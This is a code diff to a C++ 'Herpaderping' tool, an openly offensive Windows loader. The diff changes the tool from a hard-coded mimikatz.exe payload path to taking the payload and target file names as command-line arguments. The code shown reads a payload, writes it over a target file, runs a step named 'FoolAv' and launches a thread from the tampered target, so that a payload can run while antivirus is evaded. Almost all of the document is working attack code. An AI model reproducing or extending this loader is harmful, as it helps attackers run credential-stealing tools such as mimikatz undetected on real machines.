@@ -4,8 +4,6 @@
 #include "pch.hpp"
 #include "utilitaire.hpp"
 
-std::wstring PayloadFile = L"C:\\Users\\Gshoo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe";
-std::wstring TargetFile = L"test.exe";
 constexpr static std::array<uint8_t, 22> Pattern{ '\x68', '\x65', '\x72', '\x70', '\x61', '\x64',
     '\x65', '\x72', '\x70', '\x69','\x6e', '\x67', '\x20', '\x69', '\x73', '\x20', '\x63', '\x6f', 
     '\x6f', '\x6f', '\x6f', '\x6c'
@@ -15,24 +13,27 @@ constexpr static std::array<uint8_t, 22> Pattern{ '\x68', '\x65', '\x72', '\x70'
 class Herpaderping
 {
 public:
-    void start() 
+    void start(std::wstring pPayloadFile, std::wstring pTargetFile) 
     {
-        std::cout << "Author: Nikj" << std::endl;
+        std::cout << "\nAuthor: Nikj" << std::endl;
         std::cout << "Starting Herpaderping ..." << std::endl;
 
-        Herpaderping::ReadPayload();
-        Herpaderping::CreateTarget();
-        Herpaderping::WritePayloadToTarget();
+        //static std::wstring PayloadFile = pPayloadFile;
+        //static std::wstring TargetFile = pTargetFile;
+      
+        Herpaderping::ReadPayload(pPayloadFile);
+        Herpaderping::CreateTarget(pTargetFile);
+        Herpaderping::WritePayloadToTarget(pPayloadFile, pTargetFile);
         Herpaderping::FoolAv();
-        Herpaderping::CreatePayloadThreadFromTarget();
+        Herpaderping::CreatePayloadThreadFromTarget(pTargetFile);
     }
 private:
     wil::unique_handle hProcess;
     wil::unique_handle hProcessPayload;
     wil::unique_handle hProcessTarget;
     uint32_t imageEntryPointRva = 0;
-
-    HRESULT ReadPayload() {
+ 
+    HRESULT ReadPayload(std::wstring PayloadFile) {
         hProcessPayload.reset(CreateFileW(PayloadFile.c_str(),
             GENERIC_READ,
             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
@@ -50,7 +51,7 @@ private:
         return S_OK;
     }
 
-    HRESULT CreateTarget() {
+    HRESULT CreateTarget(std::wstring TargetFile) {
         hProcessTarget.reset(CreateFileW(TargetFile.c_str(),
             GENERIC_READ | GENERIC_WRITE,
             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
@@ -68,12 +69,12 @@ private:
         return S_OK;
     }
 
-    HRESULT WritePayloadToTarget()
+    HRESULT WritePayloadToTarget(std::wstring PayloadFile, std::wstring TargetFile)
         {
             HRESULT HR = Utilitaire::CopyFileByHandle(hProcessPayload.get(), hProcessTarget.get());
             RETURN_IF_FAILED(HR);
                 
-            std::cout << "[+] Copy !! Mimikatz.exe To the target" << std::endl;
+            std::wcout << "[+] Copy " << PayloadFile << " to " << TargetFile << std::endl;
                 
             // Free the payload process handle
             hProcessPayload.reset();
@@ -143,7 +144,7 @@ private:
         return S_OK;
     }
         
-    HRESULT CreatePayloadThreadFromTarget()
+    HRESULT CreatePayloadThreadFromTarget(std::wstring TargetFile)
     {
         // We prepare the Target Process Thread to be executed
         std::cout << "[+] Preparing target for execution" << std::endl;
@@ -228,8 +229,20 @@ private:
     }
 };
 
-int main()
+int wmain(int argc, wchar_t *argv[])
 {
-    Herpaderping herpaderping;
-    herpaderping.start();
+    if (argc < 3)
+    {
+        std::cerr << "Invalid number of parameters" << std::endl;
+        std::wcerr << "Usage: " << argv[0] << " PayloadFile TargetFile" << std::endl;
+    }
+    else 
+    {
+        std::wstring pPayloadFile = argv[1];
+        std::wstring pTargetFile = argv[2];
+
+        Herpaderping herpaderping;
+        herpaderping.start(pPayloadFile, pTargetFile);
+    }
+    return 0;
 }
